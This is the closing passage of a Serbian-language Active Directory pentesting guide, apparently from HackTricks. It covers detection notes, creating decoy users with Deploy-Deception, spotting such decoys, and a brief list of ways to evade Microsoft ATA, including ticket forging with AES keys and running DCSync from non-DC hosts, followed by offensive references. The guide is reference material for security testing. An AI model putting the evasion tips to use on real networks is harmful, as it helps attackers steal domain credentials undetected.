- Operatori ih lako mogu promeniti i najbolje ih je koristiti za objašnjenje zašto je cross-protocol cluster sumnjiv
- **Operational notes**:
- Neki od ovih signala zahtevaju dekriptovan saobraćaj, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili service-side visibility
- Validirajte ih u odnosu na Samba/Linux klijente, appliance-e i legacy software pre nego što ih promovišete u alerts
- Promovišite detections iz enrichment -> hunting -> alerting kako budete sticali poverenje u baseline

### **Implementing Deception Techniques**

- Implementiranje deception-a podrazumeva postavljanje zamki, kao što su decoy user-i ili računari, sa karakteristikama poput password-a koji ne ističe ili su označeni kao Trusted for Delegation. Detaljan pristup obuhvata kreiranje user-a sa određenim pravima ili njihovo dodavanje u high privilege grupe.<sup>[[2]](#references)</sup>
- Praktičan primer podrazumeva korišćenje tools-a kao što je: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o deployment-u deception techniques možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Za User Objects**: Sumnjivi indikatori obuhvataju atipičan ObjectSID, retke logon-e, datume kreiranja i mali broj pogrešnih password-a.
- **Opšti indikatori**: Poređenje atributa potencijalnih decoy objekata sa atributima legitimnih objekata može otkriti nedoslednosti. Tools kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikovanju takvih deception-a.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje enumeracije session-a na Domain Controllers kako bi se sprečila ATA detekcija.
- **Ticket Impersonation**: Korišćenje **aes** keys za kreiranje ticket-a pomaže u izbegavanju detekcije jer se ne vrši downgrade na NTLM.
- **DCSync Attacks**: Preporučuje se izvršavanje sa non-Domain Controller-a kako bi se izbegla ATA detekcija, jer će direktno izvršavanje sa Domain Controller-a pokrenuti alerts.

## References

- [1] [Vodič za napad na domain trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Falsifikovanje trust-ova za deception u Active Directory-ju](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin-a do Enterprise Admin-a](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit za Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Preuzimanje Active Directory Account-a preko Netlogon-a](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Kako upravljati izmenama u Netlogon secure channel konekcijama povezanim sa CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Putovanje kroz zaboravljene Null Session i MS-RPC interfejse](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kao bezbednosna granica između domain-a? (Deo 4) - Istraživanje zaobilaženja SID filtering-a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kao bezbednosna granica između domain-a? (Deo 5) - Golden GMSA trust attack - od child-a do parent-a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kao bezbednosna granica između domain-a? (Deo 6) - Schema change trust attack - od child-a do parent-a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA sa ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacija od administratora child domain-a do enterprise administratora za 5 minuta zloupotrebom AD CS-a, nastavak](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE u rukavu: Dizajniranje Active Directory DACL backdoor-a](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
